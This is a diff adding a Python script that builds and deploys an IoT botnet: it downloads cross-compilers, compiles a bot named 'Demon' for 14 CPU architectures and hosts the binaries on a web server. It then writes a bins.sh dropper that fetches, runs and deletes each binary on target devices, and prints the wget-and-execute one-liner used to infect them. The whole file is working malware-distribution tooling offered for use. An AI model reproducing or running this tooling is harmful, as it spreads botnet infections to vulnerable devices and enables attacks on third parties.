@@ -1,0 +1,90 @@
+import subprocess
+import urllib.request
+import sys
+import os
+
+if len(sys.argv) < 3:
+    print("\033[0;31mIncorrect Usage!")
+    print("\033[0;32mUsage: python3 {} <BOTNAME.C> <IPADDR> \033[0m".format(sys.argv[0]))
+    exit(1)
+
+bot = sys.argv[1]
+ip = sys.argv[2]
+
+yourafag = input("Get arch's? Y/n: ")
+get_arch = yourafag.lower() == "y"
+
+compileas = [
+    "Demon.mips", "Demon.mpsl", "Demon.sh4", "Demon.x86", "Demon.arm6",
+    "Demon.i686", "Demon.ppc", "Demon.i586", "Demon.m68k", "Demon.sparc",
+    "Demon.arm4", "Demon.arm5", "Demon.arm7", "Demon.ppc440fp"
+]
+
+getarch = [
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
+    'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
+    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
+    'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
+    'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
+    'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
+    'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2'
+]
+
+ccs = [
+    "cross-compiler-mips", "cross-compiler-mipsel", "cross-compiler-sh4", "cross-compiler-x86_64",
+    "cross-compiler-armv6l", "cross-compiler-i686", "cross-compiler-powerpc", "cross-compiler-i586",
+    "cross-compiler-m68k", "cross-compiler-sparc", "cross-compiler-armv4l", "cross-compiler-armv5l",
+    "cross-compiler-armv7l", "cross-compiler-powerpc-440fp"
+]
+
+def run(cmd):
+    subprocess.call(cmd, shell=True)
+
+if get_arch:
+    print("Downloading Architectures")
+    for arch in getarch:
+        run(f"wget {arch} --no-check-certificate")
+        run("tar -xf *.tar.bz2")
+        run("rm -f *.tar.bz2")
+    print("Cross Compilers Downloaded...")
+
+num = 0
+for cc in ccs:
+    try:
+        arch = cc.split("-")[2]
+        compiler_path = f"./{cc}/bin/{arch}-gcc"
+        if os.path.exists(compiler_path):
+            run(f"{compiler_path} -static -pthread -D{arch.upper()} -o {compileas[num]} {bot}")
+    except Exception as e:
+        print(f"Failed to compile with {cc}: {e}")
+    num += 1
+
+# Copy binaries to server
+for i in compileas:
+    run(f"cp {i} /var/www/html")
+
+# Generate bins.sh script
+bins_script = "/var/www/html/bins.sh"
+with open(bins_script, "w") as f:
+    f.write("#!/bin/bash\n")
+    for i in compileas:
+        f.write(f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
+                f"wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}\n")
+
+run("chmod +x " + bins_script)
+
+# Set open file limit
+run('echo "ulimit -n 99999" >> ~/.bashrc')
+
+# Print deployment command
+print("\033[0;32mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
+      f"wget http://{ip}/bins.sh; chmod 777 bins.sh; sh bins.sh\033[0m")
+
+
